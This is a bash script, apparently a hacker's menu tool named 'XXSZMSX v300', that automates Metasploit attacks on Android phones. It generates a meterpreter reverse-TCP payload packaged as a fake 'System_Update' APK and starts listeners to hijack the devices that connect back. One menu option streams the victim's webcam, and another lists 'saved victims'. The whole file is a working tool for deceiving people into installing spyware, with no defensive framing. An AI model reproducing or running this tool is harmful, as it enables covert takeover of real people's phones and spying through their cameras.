#!/bin/bash

# --- XXSZMSX VERSION 300 (THE ULTIMATE BEAST) ---
# NO HOSTS | NO PORTS | AUTO-LOOP | TEAM SYNC

R='\033[1;31m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- SECURE LOGIN ---
clear
echo -e "${R}SYSTEM ENCRYPTED - VERSION 300${N}"
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""
if [[ $password != "topsecret2026" ]]; then exit 1; fi

# --- MAIN LOOP (عشان ترجع للأداة دايماً) ---
while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ ENGINE ]: v300.0 | [ STATUS ]: GLOBAL RADAR ACTIVE"
echo -e "  [ MODE ]: ZERO-CONFIG | [ TEAM ]: MAZEN & PARTNER"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${R}GENERATE STEALTH APK (INSTANT)${N}"
echo -e "${W}[02]${N} ${R}OPEN CAMERA RADAR (AUTO-STREAM)${N}"
echo -e "${W}[03]${N} ${R}FULL DEVICE HIJACK${N}"
echo -e "${W}[04]${N} ${R}SHOW SAVED VICTIMS${N}"
echo -e "${W}[00]${N} ${W}EXIT SYSTEM${N}"

echo -en "\n${R}[V300] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] INJECTING CLOUD SETTINGS INTO APK...${N}"
        # الأداة بتسحب الهوست والبورت أوتوماتيكياً من إعدادات النظام
        # ثبتنا البورت العالمي 4444 داخلياً
        target=$(hostname -I | awk '{print $1}')
        
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target LPORT=4444 R -o "System_Update_V300.apk"
        
        echo -e "\n${W}[+] SUCCESS: APK GENERATED AND LINKED!${N}"
        echo -e "${G}[i] Returning to menu...${N}"
        sleep 2
        ;;
    2)
        echo -e "\n${R}[!] RADAR ACTIVE... WAITING FOR SIGNAL...${N}"
        # بيشغل الكاميرا فوراً وبيرجع للأداة بعد ما تقفل الجلسة
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z; sleep 10; webcam_stream; exit"
        echo -e "\n${G}[*] Session finished. Returning to menu...${N}"
        sleep 2
        ;;
    3)
        echo -e "\n${R}[!] INITIALIZING FULL CONTROL PANEL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit"
        echo -e "\n${G}[*] Control closed. Returning to menu...${N}"
        sleep 2
        ;;
    4)
        echo -e "\n${W}--- TEAM VICTIM LOGS ---${N}"
        ls -l *.apk 2>/dev/null || echo "No apps generated yet."
        read -p "Press Enter to return..."
        ;;
    0) 
        echo -e "${R}Shutting down...${N}"
        exit ;;
    *) 
        echo -e "${W}Invalid option.${N}"
        sleep 1
        ;;
esac
done
